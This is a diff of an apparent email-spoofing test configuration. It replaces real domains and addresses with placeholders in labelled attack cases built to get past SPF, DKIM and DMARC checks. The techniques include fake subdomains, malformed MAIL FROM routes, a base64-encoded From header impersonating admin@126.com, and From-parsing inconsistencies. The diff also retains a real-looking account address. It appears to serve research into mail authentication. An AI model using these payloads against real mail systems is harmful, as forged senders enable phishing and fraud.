@@ -1,7 +1,7 @@
 """
-The attacker and spoofer domain is ruin.net.cn, which is bound to a server with its 25 port shutdown.
-SPF and DKIM records are set in ruin.net.cn
-The victim address is ruin_2021@outlook.com.
+The attacker and spoofer domain is attack.com, which is bound to a server with its 25 port shutdown.
+SPF and DKIM records are set in attack.com
+The victim address is ruin@victim.com.
 PLEASE DO NOT LEAK ANY INFORMATION IN THIS FILE!!
 """
 
@@ -11,15 +11,15 @@ param = {
     # SPF=none DKIM=pass DMARC=bestguesspass
     # A3 is the same method
     'A1' : {
-        'helo': 'ruin.net.cn',
+        'helo': 'attack.com',
         'login': 0,
         
-        'mailfrom': "<any@fakesubdomain.ruin.net.cn>",
-        'receiver': '<ruin_2021@outlook.com>',
+        'mailfrom': "<any@fakesubdomain.attack.com>",
+        'receiver': '<ruin@victim.com>',
 
-        'dkim_para': {'d':b'ruin.net.cn', 's':b'selector', 'sign_header': b'From: <admin@ruin.net.cn>'},
+        'dkim_para': {'d':b'attack.com', 's':b'selector', 'sign_header': b'From: <admin@attack.com>'},
 
-        'mfrom': b'<admin@ruin.net.cn>',
+        'mfrom': b'<admin@attack.com>',
         'subject': 'A1 attack',
         'body': 'Testing.'
     },
@@ -30,15 +30,15 @@ param = {
     # While mfrom refers to another domain, DMARC will report fail
     # reason: compauth!
     'A5' : {
-        'helo': 'ruin.net.cn',
+        'helo': 'attack.com',
         'login': 0,
         
-        'mailfrom': "<@ruin.net.cn,@any.com:'any@ruin.net.cn>",
-        'receiver': '<ruin_2021@outlook.com>',
+        'mailfrom': "<@attack.com,@any.com:'any@attack.com>",
+        'receiver': '<ruin@victim.com>',
 
-        'dkim_para': {'d':b'ruin.net.cn', 's':b'selector', 'sign_header': b'From: <admin@ruin.net.cn>'},
+        'dkim_para': {'d':b'attack.com', 's':b'selector', 'sign_header': b'From: <admin@attack.com>'},
 
-        'mfrom': b'<admin@ruin.net.cn>',
+        'mfrom': b'<admin@attack.com>',
         'subject': 'A5 attack',
         'body': 'Testing.'
     },
@@ -46,30 +46,30 @@ param = {
     # A10: Email address encoding
     # SPF=pass DKIM=none DMARC=bestguesspass
     'A10' : {
-        'helo': 'ruin.net.cn',
+        'helo': 'attack.com',
         'login': 0,
-        'mailfrom': '<any@ruin.net.cn>',
-        'receiver': '<ruin_2021@outlook.com>',
+        'mailfrom': '<any@attack.com>',
+        'receiver': '<ruin@victim.com>',
 
-        # 'dkim_para': {'d':b'ruin.net.cn', 's':b'selector', 'sign_header': b'From: <admin@ruin.net.cn>'},
+        # 'dkim_para': {'d':b'attack.com', 's':b'selector', 'sign_header': b'From: <admin@attack.com>'},
         'dkim_para': None,
 
-        'mfrom': b'=?utf-8?B?'+base64.b64encode(b"admin@126.com")+ b'?='+b',<any@ruin.net.cn>',
+        'mfrom': b'=?utf-8?B?'+base64.b64encode(b"admin@126.com")+ b'?='+b',<any@attack.com>',
         'subject': 'A10 attack',
         'body': 'Testing.'
     },
     # A13: Parsing inconsistencies
     # SPF=pass DKIM=none DMARC=bestguesspass
     'A13' : {
-        'helo': 'ruin.net.cn',
+        'helo': 'attack.com',
         'login': 0,
-        'mailfrom': '<any@ruin.net.cn>',
-        'receiver': '<ruin_2021@outlook.com>',
+        'mailfrom': '<any@attack.com>',
+        'receiver': '<ruin@victim.com>',
 
-        # 'dkim_para': {'d':b'ruin.net.cn', 's':b'selector', 'sign_header': b'From: <admin@ruin.net.cn>'},
+        # 'dkim_para': {'d':b'attack.com', 's':b'selector', 'sign_header': b'From: <admin@attack.com>'},
         'dkim_para': None,
 
-        'mfrom': b'admin@ruin.net.cn,<any@ruin.net.cn>',
+        'mfrom': b'admin@attack.com,<any@attack.com>',
         'subject': 'A13 attack',
         'body': 'Testing.'
     },
@@ -80,7 +80,7 @@ param = {
         'login': 1,
         'sender': 'jiarun1234@126.com',
         'mailfrom': '<jiarun1234@126.com>',
-        'receiver': '<ruin_2021@outlook.com>',
+        'receiver': '<ruin@victim.com>',
 
         'dkim_para': None,
 
